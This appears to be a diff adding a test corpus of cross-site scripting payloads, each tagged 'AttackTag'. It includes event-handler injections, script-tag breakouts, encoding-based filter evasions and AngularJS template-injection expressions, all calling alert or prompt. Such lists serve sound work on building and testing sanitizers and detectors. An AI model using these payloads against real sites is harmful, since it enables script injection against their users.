@@ -1,0 +1,25 @@
+"-prompt(1)- class='AttackTag'"
+'-prompt(1)- class="AttackTag"'
+";a=prompt,a(); class='AttackTag'//
+';a=prompt,a(); class="AttackTag"//
+'-eval("window['pro'%2B'mpt'](1)")- class="AttackTag"'
+"-eval("window['pro'%2B'mpt'](1)")- class='AttackTag'"
+"onclick=prompt(1) class='AttackTag'>"@x.y
+"onclick=prompt(1) class='AttackTag'><svg/onload=prompt(1) class='AttackTag'>"@x.y
+<img/src/onerror=prompt(1) class='AttackTag'>
+<img class="AttackTag" src/onerror=prompt(1) class='AttackTag'>
+<img class="AttackTag" src =q onerror=prompt(1) class='AttackTag'>
+" ><script class="AttackTag">alert(1);</script>
+' ><script class="AttackTag">alert(1);</script>
+</scrip</script>t><img class="AttackTag" src =q onerror=prompt(1) class='AttackTag'>
+<script\x20type="text/javascript" class="AttackTag">javascript:alert(1);</script>
+]<img+src=/+onerror=alert(1)+class="AttackTag">
+\x3Cscript>javascript:alert(1)</script>
+<script class="AttackTag">javascript:alert(1)</script\x0D
+<script class="AttackTag"charset="\x22>javascript:alert(1)</script>
+<!--\x3E<img class="AttackTag" src=xxx:x onerror=javascript:alert(1)> -->
+<script class="AttackTag">/* *\x2A/javascript:alert(1)// */</script>
+<style></style\x3E<img class="AttackTag" src="about:blank" onerror=javascript:alert(1)//></style>
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
+{{$on.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
